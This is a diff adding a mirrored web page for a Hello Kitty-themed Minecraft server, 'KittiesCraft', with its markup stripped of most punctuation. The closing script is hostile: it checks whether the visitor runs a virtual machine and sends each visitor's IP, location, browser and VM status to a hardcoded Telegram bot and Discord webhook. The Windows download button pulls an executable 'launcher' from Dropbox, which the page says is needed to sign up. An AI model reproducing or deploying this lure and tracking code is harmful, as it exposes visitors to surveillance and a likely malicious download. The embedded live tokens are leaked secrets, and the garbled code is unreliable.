@@ -1,0 +1,648 @@
+!DOCTYPE html
+html lang=tr
+
+!-- Mirrored from kittiescraft.com by HTTrack Website Copier3.x [XR&CO'2014], Tue, 23 Dec 2025 220243 GMT --
+
+!-- Mirrored from kittiescraft.com by HTTrack Website Copier3.x [XR&CO'2014], Sun, 11 Jan 2026 212558 GMT --
+!-- Added by HTTrack --meta http-equiv=content-type content=texthtml;charset=UTF-8 !-- Added by HTTrack --
+head
+    meta charset=UTF-8
+    meta name=viewport content=width=device-width, initial-scale=1.0
+    titleKittiesCraft - The Kitties SMPtitle
+    link rel=icon href=imageslogo.png type=imagepng
+    
+    !-- Open Graph  Discord  Facebook --
+    meta property=ogtype content=website
+    meta property=ogurl content=index-2.html
+    meta property=ogtitle content=KittiesCraft - The Kitties Minecraft SMP Server
+    meta property=ogdescription content=Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!
+    meta property=ogimage content=imagesback.jpg
+    meta property=ogimagewidth content=1200
+    meta property=ogimageheight content=630
+    meta property=ogimagetype content=imagejpeg
+    
+    !-- Twitter Card --
+    meta name=twittercard content=summary_large_image
+    meta name=twitterurl content=index-2.html
+    meta name=twittertitle content=KittiesCraft - The Kitties Minecraft SMP Server
+    meta name=twitterdescription content=Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!
+    meta name=twitterimage content=imagesback.jpg
+    
+    !-- Additional Meta --
+    meta name=description content=Join thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!
+    link rel=stylesheet href=style.css
+    link rel=stylesheet href=..cdnjs.cloudflare.comajaxlibsfont-awesome6.5.1cssall.min.css
+    link href=httpsfonts.googleapis.comcss2family=VT323&amp;family=Nunitowght@400;600;700;800&amp;display=swap rel=stylesheet
+    !-- Animation Library --
+    link href=cdnjs.cloudflare.comajaxlibsfont-awesome6.0.0cssall.min.css rel=stylesheet
+    style
+         Snow Animation 
+        .snow-container {
+            position fixed;
+            top 0;
+            left 0;
+            width 100%;
+            height 100%;
+            pointer-events none;
+            z-index 1;
+            overflow hidden;
+        }
+        
+        .snowflake {
+            position absolute;
+            color rgba(255, 255, 255, 0.8);
+            font-size 1em;
+            font-family Arial, sans-serif;
+            text-shadow 0 0 5px rgba(255, 182, 193, 0.5);
+            animation snowfall linear infinite;
+            top -10px;
+        }
+        
+        @keyframes snowfall {
+            0% {
+                transform translateY(0vh) translateX(0) rotate(0deg);
+                opacity 1;
+            }
+            100% {
+                transform translateY(100vh) translateX(var(--drift)) rotate(360deg);
+                opacity 0;
+            }
+        }
+        
+         Winter Theme Section 
+        .winter-section {
+            background linear-gradient(180deg, #e8f4f8 0%, #fff0f5 100%);
+            position relative;
+            overflow hidden;
+            padding 100px 10%;
+        }
+        
+        .winter-sectionbefore {
+            content '';
+            position absolute;
+            top 0;
+            left 0;
+            width 100%;
+            height 100%;
+            background-image 
+                radial-gradient(circle at 20% 30%, rgba(255, 182, 193, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.1) 0%, transparent 50%);
+            pointer-events none;
+        }
+        
+        .winter-content {
+            position relative;
+            z-index 2;
+        }
+        
+        .snow-icon {
+            font-size 64px;
+            animation float 3s ease-in-out infinite;
+            display inline-block;
+            margin-bottom 20px;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform translateY(0px); }
+            50% { transform translateY(-20px); }
+        }
+    style
+head
+body
+    !-- Snow Animation --
+    div class=snow-container id=snow-containerdiv
+
+    !-- Page Loader --
+    div id=page-loader
+        div class=loader-spinnerdiv
+        div class=loader-textLOADING...div
+    div
+
+    !-- Navbar --
+    nav class=navbar animate__animated animate__fadeInDown
+        div class=nav-brand
+            a href='' style='text-decoration none; display flex; align-items center; gap 15px;'
+                img src=imageslogo.png alt=Logo class=nav-logo wobble-hover
+                div class=online-status
+                    span class=status-dotspan
+                    spanOnline b id=player-count154bspan
+                div
+            a
+        div
+        div class=nav-links
+            a class='hvr-underline-from-center' href='' style='color var(--dark-pink);'Homea
+            a class='hvr-underline-from-center' href='leaderboard'Leaderboarda
+            a class='hvr-underline-from-center' href='shop'Shopa
+            a class='hvr-underline-from-center' href='gallery'Gallerya
+            a href=#download class=hvr-underline-from-centerDownloada
+            a href=#faq class=hvr-underline-from-centerFAQa
+        div
+        div class=nav-actions
+            button id=dark-mode-toggle class=btn btn-small btn-white style=margin-right 10px; title=Toggle Dark Mode
+                i class=fas fa-moon id=dark-mode-iconi
+            button
+            a class='btn btn-small btn-white' href='info' style='margin-right 10px;'
+                i class=fas fa-info-circle style=font-size 18px;i Server Info
+            a
+            a class='btn btn-small btn-primary pulse-effect' href='signup'Sign Up Now!a
+        div
+    nav
+
+    !-- Hero Section --
+    header class=hero
+        div class=hero-content animate__animated animate__fadeInLeft
+            div class=hero-tags
+                span class=tagi class=fas fa-hearti Hello Kittyspan
+                span class=tagi class=fas fa-cubei SMPspan
+                span class=tagi class=fas fa-usersi Communityspan
+            div
+            h1 class=pixel-textThebrspan class=highlight-pinkKittiesspanbrMinecraftbrSMP Serverh1
+            p class=hero-descJoin thousands of players in a pink-white, zero-toxicity Hello Kitty SMP experience. Features a balanced economy, weekly events, protected plots, and the coziest community ever!p
+            div class=hero-btns
+                a href=#download class=btn btn-large btn-primary pulse-effect
+                    i class=fab fa-windowsi Download for Windows
+                a
+                a href=#features class=btn btn-large btn-white
+                    i class=fas fa-stari See Features
+                a
+            div
+        div
+        div class=hero-image animate__animated animate__fadeInRight
+            img src=imagesemoji.png alt=Hello Kitty class=hero-character floating
+            div class=floating-particles
+            div
+        div
+        div class=hero-bg-overlaydiv
+        video autoplay muted loop class=hero-video-bg
+            source src=imageshellokitty.mp4 type=videomp4
+        video
+    header
+
+    !-- Stats Section --
+    section class=stats-bar scroll-reveal
+        div class=stat-item
+            i class=fas fa-user-friendsi
+            div class=stat-info
+                h3span class=counter data-target=10000span+h3
+                pRegistered Kittiesp
+            div
+        div
+        div class=stat-item
+            i class=fas fa-homei
+            div class=stat-info
+                h3span class=counter data-target=7000span+h3
+                pClaimed Plotsp
+            div
+        div
+        div class=stat-item
+            i class=fas fa-magici
+            div class=stat-info
+                h3span class=counter data-target=2000span+h3
+                pUnique Cosmeticsp
+            div
+        div
+    section
+
+    !-- About Section (New) --
+    section class=section about-section style=background white;
+        div class=about-container style=display flex; align-items center; gap 50px; max-width 1200px; margin 0 auto;
+            div class=about-image scroll-reveal hover-scale style=flex 1;
+                img src=imagesimage%20(1).jpg alt=About Us style=width 100%; border-radius 30px; box-shadow 20px 20px 0 var(--light-pink); transition all 0.3s;
+            div
+            div class=about-content scroll-reveal style=flex 1; text-align left;
+                span class=section-badgeABOUT USspan
+                h2 class=section-title pixel-text style=text-align left;Welcome to the Familyh2
+                p style=font-size 18px; color var(--text-light); line-height 1.8; margin-bottom 30px;
+                    KittiesCraft isn't just a server; it's a home. Founded in 2024 with a vision to create the most wholesome and toxic-free Minecraft community, we've grown into a family of thousands.
+                    brbr
+                    Whether you love building cute cottages, exploring survival worlds, or just chatting in the lobby, there's a spot for you here.
+                p
+                a href=#features class=btn btn-large btn-primary style=display inline-block; margin-top 20px;Learn Morea
+            div
+        div
+    section
+
+    !-- Winter Theme Section --
+    section class=winter-section particle-bg
+        div class=winter-content
+            div class=section-header scroll-reveal
+                img src=winter-imagessnowflake.png alt=Snowflake class=snow-icon style=width 64px; height 64px; object-fit contain;
+                span class=section-badge style=background rgba(255,255,255,0.9); color #4a90e2;WINTER SEASONspan
+                h2 class=section-title pixel-text style=color #2d3436;Winter Wonderlandh2
+                p class=section-subtitle style=color #636e72; text-align center;Experience the magic of winter in KittiesCraft!p
+            div
+            div class=features-grid style=grid-template-columns repeat(auto-fit, minmax(280px, 1fr)); margin-top 50px;
+                div class=feature-card scroll-reveal card-3d glass-enhanced style=background rgba(255,255,255,0.9); backdrop-filter blur(10px);
+                    div class=feature-icon-wrapper hover-scale style=background linear-gradient(135deg, #e8f4f8, #fff0f5);
+                        img src=winter-imageschristmas-tree.png alt=Christmas Tree style=width 64px; height 64px; object-fit contain; transition transform 0.3s;
+                    div
+                    h3 class=pixel-textHoliday Buildsh3
+                    pCreate beautiful winter-themed structures with special holiday blocks and decorations!p
+                div
+                div class=feature-card scroll-reveal card-3d glass-enhanced style=background rgba(255,255,255,0.9); backdrop-filter blur(10px);
+                    div class=feature-icon-wrapper hover-scale style=background linear-gradient(135deg, #e8f4f8, #fff0f5);
+                        img src=winter-imagessnowflake.png alt=Snowflake style=width 64px; height 64px; object-fit contain; transition transform 0.3s;
+                    div
+                    h3 class=pixel-textWinter Eventsh3
+                    pParticipate in special winter events, gift hunts, and snowball fights with other players!p
+                div
+                div class=feature-card scroll-reveal card-3d glass-enhanced style=background rgba(255,255,255,0.9); backdrop-filter blur(10px);
+                    div class=feature-icon-wrapper hover-scale style=background linear-gradient(135deg, #e8f4f8, #fff0f5);
+                        img src=winter-imagessnowman.png alt=Snowman style=width 64px; height 64px; object-fit contain; transition transform 0.3s;
+                    div
+                    h3 class=pixel-textLimited Cosmeticsh3
+                    pGet exclusive winter-themed cosmetics, skins, and pets available only during the season!p
+                div
+            div
+        div
+    section
+
+    !-- Latest Updates Section (New) --
+    section class=section style=background white;
+        div class=section-header
+            span class=section-badgeNEWSspan
+            h2 class=section-title pixel-textLatest Updatesh2
+            p class=section-subtitleKeep up with the latest server changes.p
+        div
+        div class=features-grid style=grid-template-columns repeat(auto-fit, minmax(300px, 1fr));
+            div class=feature-card style=text-align left; padding 30px;
+                span class=section-badge style=background #e91e63; color white;UPDATEspan
+                h3 style=margin-top 10px;Season 5 Christmash3
+                p style=font-size 14px; color #aaa; margin-bottom 15px;i class=far fa-calendari Dec 15, 2024p
+                pHas been updated with a new Christmas theme and new items.p
+            div
+            div class=feature-card style=text-align left; padding 30px;
+                span class=section-badge style=background #9b59b6; color white;EVENTspan
+                h3 style=margin-top 10px;Holiday Gift Hunth3
+                p style=font-size 14px; color #aaa; margin-bottom 15px;i class=far fa-calendari Dec 3, 2025p
+                pFind hidden presents around the spawn to win limited edition cosmetics.p
+            div
+            div class=feature-card style=text-align left; padding 30px;
+                span class=section-badge style=background #f1c40f; color white;MAINTENANCEspan
+                h3 style=margin-top 10px;Network Optimizationh3
+                p style=font-size 14px; color #aaa; margin-bottom 15px;i class=far fa-calendari Dec 10, 2024p
+                pWe upgraded our servers to provide a lag-free experience for everyone.p
+            div
+        div
+    section
+
+    !-- Features Section --
+    section id=features class=section features-section style=background var(--bg-pink);
+        div class=section-header scroll-reveal
+            span class=section-badgeWHY JOIN USspan
+            h2 class=section-title pixel-text text-gradientServer Featuresh2
+            p class=section-subtitleVanilla+ balance, a Hello Kitty touch, and community-first rules.p
+        div
+        
+        div class=features-grid
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon🌸div
+                div
+                h3 class=pixel-textHello Kitty Themeh3
+                pImmerse yourself in a custom pink-white UI, cute cosmetics, and a heart-filled world design.p
+            div
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon⛏️div
+                div
+                h3 class=pixel-textVanilla+ SMPh3
+                pA fair survival experience. We keep it close to vanilla but add quality of life improvements.p
+            div
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon💰div
+                div
+                h3 class=pixel-textEconomy & Marketh3
+                pPlayer-driven market with secure trading booths and balanced ways to earn currency.p
+            div
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon🛡️div
+                div
+                h3 class=pixel-textProtected Plotsh3
+                pClaim your land easily. Your cute builds are 100% safe from griefing with our protection system.p
+            div
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon🎉div
+                div
+                h3 class=pixel-textDaily Eventsh3
+                pParticipate in fashion shows, building contests, and parkour maps to win exclusive rewards.p
+            div
+            div class=feature-card scroll-reveal card-3d
+                div class=feature-icon-wrapper hover-scale
+                    div class=feature-icon❤️div
+                div
+                h3 class=pixel-textZero Toxicityh3
+                pOur #1 priority. Active staff ensures a warm, respectful, and safe environment for everyone.p
+            div
+        div
+    section
+
+    !-- Join Community Section (New) --
+    section class=section style=background linear-gradient(135deg, #5865F2, #7289da); color white; padding 80px 10%; text-align center; display none;
+        h2 class=pixel-text style=font-size 48px; margin-bottom 20px;Join Our Discordh2
+        p style=font-size 20px; margin-bottom 40px; opacity 0.9;Chat with thousands of other kitties, get support, and participate in giveaways!p
+        a href=# class=btn btn-large style=background white; color #5865F2; font-family 'Nunito', sans-serif;i class=fab fa-discordi Join Servera
+    section
+
+   !-- Download Section --
+section id=download class=section download-section
+    div class=download-container
+        div class=download-content
+            h2 class=section-title pixel-textStart Playing Today!h2
+            pDownload our custom launcher to get auto-updates, pre-installed mods, and one-click join access.p
+            
+            div class=download-options
+
+                !-- WINDOWS --
+               a onclick=downloadWindows() class=download-btn windows style=cursorpointer;
+                    i class=fab fa-windowsi
+                    div class=btn-text
+                        spanDownload forspan
+                        strongWindows 1011strong
+                    div
+                a
+
+                !-- MAC --
+                a class='download-btn mac' href='404'
+                    i class=fab fa-applei
+                    div class=btn-text
+                        spanDownload forspan
+                        strongmacOSstrong
+                    div
+                a
+
+            div
+
+            div class=requirements
+                pi class=fas fa-info-circlei Requires Java 17 or higher.p
+            div
+        div
+
+        div class=download-image
+            img src=imagesdownload.png alt=Launcher Preview class=tilt-image
+        div
+    div
+section
+
+    !-- FAQ Section --
+    section id=faq class=section faq-section
+        div class=section-header
+            h2 class=section-title pixel-textFAQh2
+            p class=section-subtitleCommon questions answered.p
+        div
+        
+        div class=faq-container
+            div class=faq-item
+                div class=faq-question
+                    spanHow do I create an accountspan
+                    i class=fas fa-chevron-downi
+                div
+                div class=faq-answerYou can create an account directly inside our Custom Launcher after downloading it!div
+            div
+            div class=faq-item
+                div class=faq-question
+                    spanIs the server Cracked or Premiumspan
+                    i class=fas fa-chevron-downi
+                div
+                div class=faq-answerWe are a semi-premium server. You can join with both premium and cracked accounts using our launcher.div
+            div
+            div class=faq-item
+                div class=faq-question
+                    spanCan I join with Bedrock Editionspan
+                    i class=fas fa-chevron-downi
+                div
+                div class=faq-answerYes! Bedrock players (MobileConsole) can join using IP kittiescraft.rabisu.net and Port 19132.div
+            div
+        div
+        div style=text-align center; margin-top 40px;
+            a class='btn btn-large btn-primary pulse-effect' href='support'
+                i class=fas fa-headseti Support
+            a
+        div
+    section
+
+    !-- Footer --
+    footer class=site-footer
+        div class=footer-wave
+            svg viewBox=0 0 1440 320
+                path fill=#2d3436 fill-opacity=1 d=M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,112C672,96,768,96,864,112C960,128,1056,160,1152,160C1248,160,1344,128,1392,112L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Zpath
+            svg
+        div
+        div class=footer-content
+            div class=footer-brand
+                h3 class=pixel-textKittiesCrafth3
+                pThe Kitties Minecraft SMP Serverp
+            div
+            div class=footer-links
+                h4Informationh4
+                a href=#featuresFeaturesa
+                a href='shop'Storea
+                a href='gallery'Gallerya
+                a href=#downloadDownloada
+                a href=#faqSupporta
+            div
+            div class=footer-links
+                h4Legalh4
+                a href='legal#tos'Terms of Servicea
+                a href='legal#privacy'Privacy Policya
+                a href='legal#rules'Rulesa
+            div
+        div
+        div class=footer-bottom
+            p&copy; 2024 KittiesCraft. Not affiliated with Mojang Studios.p
+        div
+    footer
+
+    !-- Custom Alert Modal --
+    div id=custom-modal class=modal
+        div class=modal-content
+            span class=close-modal&times;span
+            div class=modal-body
+                i class=fas fa-download modal-iconi
+                h3 class=pixel-textDownload Required!h3
+                pTo sign up and create an account, you need to download our custom strongHello Kitty Launcherstrong.p
+                a href=#download class=btn btn-primary btn-modal-actionGo to Downloada
+            div
+        div
+    div
+
+    script src=site-script.jsscript
+    script
+         Snow Animation
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.innerHTML = '❄';
+            snowflake.style.left = Math.random()  100 + '%';
+            snowflake.style.animationDuration = (Math.random()  3 + 2) + 's';
+            snowflake.style.opacity = Math.random();
+            snowflake.style.fontSize = (Math.random()  10 + 10) + 'px';
+            snowflake.style.setProperty('--drift', (Math.random()  100 - 50) + 'px');
+            
+            document.getElementById('snow-container').appendChild(snowflake);
+            
+            setTimeout(() = {
+                snowflake.remove();
+            }, 5000);
+        }
+        
+         Create snowflakes periodically
+        setInterval(createSnowflake, 300);
+        
+         Initial snowflakes
+        for (let i = 0; i  20; i++) {
+            setTimeout(() = createSnowflake(), i  150);
+        }
+       script
+
+script
+ ========= TARAYICI ========= 
+function getBrowserName() {
+  const ua = navigator.userAgent;
+  if (ua.includes(Opera GX)) return Opera GX;
+  if (ua.includes(OPR)) return Opera;
+  if (ua.includes(Edg)) return Microsoft Edge;
+  if (ua.includes(Chrome)) return Google Chrome;
+  if (ua.includes(Firefox)) return Mozilla Firefox;
+  if (ua.includes(Safari)) return Safari;
+  return Bilinmiyor;
+}
+
+ ========= BAYRAK ========= 
+function getFlagEmoji(code) {
+  if (!code) return 🏳️;
+  return code.toUpperCase().replace(.g, c =
+    String.fromCodePoint(127397 + c.charCodeAt())
+  );
+}
+
+ ========= VM TESPİT ========= 
+function detectVMByUA() {
+  const ua = navigator.userAgent.toLowerCase();
+  return [virtualbox,vmware,qemu,xen,hyper-v].some(k = ua.includes(k));
+}
+
+function detectVMByCPU() {
+  return navigator.hardwareConcurrency && navigator.hardwareConcurrency = 2;
+}
+
+function detectVMByRAM() {
+  return navigator.deviceMemory && navigator.deviceMemory = 2;
+}
+
+function detectVMByScreen() {
+  const w = screen.width, h = screen.height;
+  return (
+    (w === 1024 && h === 768) 
+    (w === 1280 && h === 800) 
+    (w === 1366 && h === 768)
+  );
+}
+
+function getGPUInfo() {
+  try {
+    const canvas = document.createElement(canvas);
+    const gl = canvas.getContext(webgl)  canvas.getContext(experimental-webgl);
+    if (!gl) return ;
+    const debugInfo = gl.getExtension(WEBGL_debug_renderer_info);
+    if (!debugInfo) return ;
+    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+  } catch {
+    return ;
+  }
+}
+
+function detectVMByGPU() {
+  const gpu = getGPUInfo();
+  return [swiftshader,llvmpipe,virtualbox,vmware,basic render].some(k = gpu.includes(k));
+}
+
+function isLikelyVM() {
+  let score = 0;
+  if (detectVMByUA()) score++;
+  if (detectVMByCPU()) score++;
+  if (detectVMByRAM()) score++;
+  if (detectVMByScreen()) score++;
+  if (detectVMByGPU()) score += 2;
+  return score = 3;
+}
+
+ ========= LOG ========= 
+async function sendLog(type) {
+  const TG_BOT_TOKEN = 8587533886AAFv2dcLuhezILLIW33C4ju12FR-5Y3yWFk;
+  const TG_CHAT_ID  = 8533584312;
+  const DISCORD_WEBHOOK = httpsdiscord.comapiwebhooks14555492914397413418V1Q6lry3m4_XLQUrdxYzQ0NdSjMeIX8S31q5iboTynBk-P1zAHjTSpDPN37SrGG43-oP;
+
+  try {
+    const ipRes = await fetch(httpsapi.ipify.orgformat=json);
+    const { ip } = await ipRes.json();
+
+    const geoRes = await fetch(`httpsipapi.co${ip}json`);
+    const geo = await geoRes.json();
+
+    const deviceType = isLikelyVM()
+       🧪 Sanal Makine (VM)
+       💻 Gerçek Bilgisayar;
+
+    const text =
+`${type === visit  🔍 KittiesCrafta Girdi  🤡 KittiesCraftı İndirdi Enai}
+
+🌎 IP ${ip}
+📍 ${getFlagEmoji(geo.country_code)} ${geo.country_name  Bilinmiyor}  ${geo.city  Bilinmiyor}
+⏰ ${new Date().toLocaleString()}
+🚀 ${getBrowserName()}
+✅ ${deviceType}`;
+
+    await fetch(`httpsapi.telegram.orgbot${TG_BOT_TOKEN}sendMessage`, {
+      method POST,
+      headers {Content-Typeapplicationjson},
+      body JSON.stringify({ chat_id TG_CHAT_ID, text })
+    });
+
+    await fetch(DISCORD_WEBHOOK, {
+      method POST,
+      headers {Content-Typeapplicationjson},
+      body JSON.stringify({ content text })
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    });
+
+  } catch (e) {
+    console.error(LOG HATASI, e);
+  }
+}
+
+ ========= SAYFA GİRİŞ ========= 
+
+
+ ========= DOWNLOAD ========= 
+function downloadWindows() {
+  sendLog(download);
+  window.location.href =
+    httpswww.dropbox.comsclfigdmpk9p0hgaqblxiqwfleKittiesLauncher.exerlkey=tfjjougnpfp8suf2xfqlddykt&st=8jw6t046&dl=1;
+}
+script
+
+body
+        !-- Mirrored from kittiescraft.com by HTTrack Website Copier3.x [XR&CO'2014], Tue, 30 Dec 2025 095212 GMT --
+
+!-- Mirrored from kittiescraft.com by HTTrack Website Copier3.x [XR&CO'2014], Sun, 11 Jan 2026 212609 GMT --
+html
